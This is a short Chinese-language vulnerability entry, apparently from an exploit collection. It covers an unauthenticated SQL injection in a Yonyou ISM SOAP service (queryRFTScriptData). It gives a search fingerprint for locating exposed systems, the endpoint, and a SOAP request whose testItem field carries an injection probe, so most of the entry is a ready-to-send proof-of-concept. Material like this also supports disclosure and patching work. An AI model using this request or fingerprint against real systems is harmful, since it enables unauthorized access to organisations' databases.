# 用友ismqueryRFTScriptData参数存在SQL注入漏洞

- **系统**：用友　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`app="用友-ism"`
- **请求**：`POST /uapws/service/nc.itf.sdp.web.autotest.IAutoTestWebService HTTP/1.1`

**请求体 / payload**
```
未授权接口
/uapws/service/nc.itf.sdp.web.autotest.IAutoTestWebService?wsdl

testItem参数存在sql注入
Cookie: JSESSIONID=CD455D10BBE0F87FB8D6D6CEED880D58.server
SOAPAction: urn:queryRFTScriptData
Content-Type: text/xml;charset=UTF-8
Host: xx.xx.xx.xx
Content-Length: 739
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:iaut="http://autotest.web.sdp.itf.nc/IAutoTestWebService">
<soapenv:Header/>
<soapenv:Body>
<iaut:queryRFTScriptData>
<queryInfo>
<!--type: string-->
<testItem>gero et'</testItem>
<!--type: string-->
<moduleName>sonoras imperio</moduleName>
<!--type: string--…（脚本共 849 字，完整版见原文）
```

**其他**
- 用友ism queryRFTScriptData参数存在SQL注入漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 用友ism